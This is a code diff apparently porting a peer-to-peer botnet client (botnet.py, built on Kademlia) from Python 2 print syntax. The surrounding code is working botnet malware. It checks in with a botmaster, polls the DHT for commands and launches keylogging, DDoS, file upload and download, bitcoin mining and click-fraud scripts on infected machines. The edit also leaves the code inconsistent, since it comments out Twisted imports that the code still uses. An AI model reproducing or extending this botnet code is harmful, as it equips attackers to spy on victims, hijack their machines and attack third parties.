@@ -1,5 +1,5 @@
-from twisted.internet import reactor, task, defer #TWISTD
-from twisted.python import log #TWISTD
+#from twisted.internet import reactor, task, defer #TWISTD
+#from twisted.python import log #TWISTD
 from kademlia.network import Server
 from collections import Counter
 import subprocess, time, sys, hashlib, time
@@ -17,10 +17,10 @@ import subprocess, time, sys, hashlib, time
 # THE TWISTD DEFERRED FUNCTION APPEARS IN 2 LOCATIONS IN THIS PROJECT IT IS DOCUMENTED IN AUTHORS ORIGINAL COMMENTS, WILL POST DOCUMENTATION ON THIS IN DISCORD.
 
 #CHANGE ME: LOG
-log.startLogging(sys.stdout)
+#log.startLogging(sys.stdout)
 
 if len(sys.argv) != 4:
-    print "Usage: python botnet.py <bootstrap ip> <bootstrap port> <bot port>"
+    print("Usage: python botnet.py <bootstrap ip> <bootstrap port> <bot port>")
     exit(0)
 bootstrap_ip = str(sys.argv[1])
 port = int(sys.argv[2])
@@ -66,32 +66,32 @@ def get_cmd(value, server, bot):
             if cmd == 'KEYLOG':
                 if bot.cmdsrun['KEYLOG'] is False:
                     tmp = 'python keylogger.py {0}'.format(bot.cmdkey)
-                    print "Starting keylogger"
+                    print("Starting keylogger")
                     process = subprocess.Popen(tmp.split(), shell=False)
                     bot.pgroup.append(process)
                     bot.cmdsrun['KEYLOG'] = True
             if cmd == 'DDOS':
                 if bot.cmdsrun['DDOS'] is False:
                     tmp = 'python ddos.py {0}'.format(' '.join(x[1:]))
-                    print "Starting DDOS on {0}".format(tmp)
+                    print("Starting DDOS on {0}".format(tmp))
                     process = subprocess.Popen(tmp.split(), shell=False)
                     bot.cmdsrun['DDOS'] = True
             if cmd == 'UPLOAD':
                 tmp = 'python upload.py {0}'.format(' '.join(x[1:]))
-                print "Starting upload on {0}".format(tmp)
+                print("Starting upload on {0}".format(tmp))
                 process = subprocess.Popen(tmp.split(), shell=False)
 
             if cmd == 'DOWNLOAD':
                 tmp = 'python download.py {0}'.format(' '.join(x[1:]))
-                print "Starting DOWNLOAD on {0}".format(tmp)
+                print("Starting DOWNLOAD on {0}".format(tmp))
                 process = subprocess.Popen(tmp.split(), shell=False)
             if cmd == 'BITCOIN':
                 tmp = 'python mine.py {0}'.format(' '.join(x[1:]))
-                print "Starting BITCOING MINING on {0}".format(tmp)
+                print("Starting BITCOING MINING on {0}".format(tmp))
                 process = subprocess.Popen(tmp.split(), shell=False)
             if cmd == 'CLICKFRAUD':
                 tmp = 'python clickFraud.py {0}'.format(' '.join(x[1:]))
-                print "Starting CLICKFRAUD on {0}".format(tmp)
+                print("Starting CLICKFRAUD on {0}".format(tmp))
                 process = subprocess.Popen(tmp.split(), shell=False)
 
     except Exception, e:
@@ -102,7 +102,7 @@ def get_cmd(value, server, bot):
 # The security can be increased by using encryption and a few other things,
 # but this is just a proof of concept
 def wait_cmd(server, bot):
-    print "Checking for command"
+    print("Checking for command")
     server.get(bot.cmdkey).addCallback(get_cmd, server, bot)
 
 # This function is part of a deferred chain to check in with the botmaster after joining a network
@@ -114,9 +114,9 @@ def ack_valid(value, server, bot):
     # t = hashlib.sha1().update('ack')
     if value != str(bot.id):
         callhome(server, bot)
-        print "no ack"
+        print("no ack")
     else:
-        print "we have an ack"
+        print("we have an ack")
         cmdloop = task.LoopingCall(wait_cmd, server, bot)
         cmdloop.start(5)
         # wait_cmd(None,server,bot)
@@ -139,7 +139,7 @@ def setup(ip_list, server):
     # check that it got a result back
     # print str(server.node.long_id)
     if not len(ip_list):
-        print "Could not determine my ip, retrying"
+        print("Could not determine my ip, retrying")
         server.inetVisibleIP().addCallback(setup, server)
     myip = most_common(ip_list)
     idhash = get_hash(str(server.node.long_id))
@@ -149,7 +149,7 @@ def setup(ip_list, server):
 #CHANGE ME: REACTOR
 def bootstrapDone(found, server):
     if len(found) == 0:
-        print "Could not connect to the bootstrap server."
+        print("Could not connect to the bootstrap server.")
         reactor.stop()
         exit(0)
     server.inetVisibleIP().addCallback(setup, server)
